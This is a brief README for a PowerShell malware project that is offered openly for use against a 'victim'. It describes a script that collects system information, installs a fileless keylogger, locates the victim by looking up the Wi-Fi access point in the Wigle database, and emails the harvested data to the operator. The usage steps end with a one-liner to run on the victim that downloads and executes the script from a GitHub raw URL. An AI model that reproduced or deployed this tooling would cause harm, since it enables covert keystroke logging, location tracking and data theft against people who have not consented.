# powershellScripts



## Scrapper
Powershell script that 
- Gathers info
- Plants a fileless kelyogger
- Finds the geolocation of the client through querrying the AP name in the Wiggle database
- Sends all info through email back

## How to use
- Fork project to own github so you can change the needed variables
- Change the wiggle api key (optional if you dont need geolocation)
- Change the receiver email in both scrapper.ps1 and mailer.ps1
- Run in powershell on victim : 
``` Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/yourGithubRepo/master/scrapper.ps1') ```
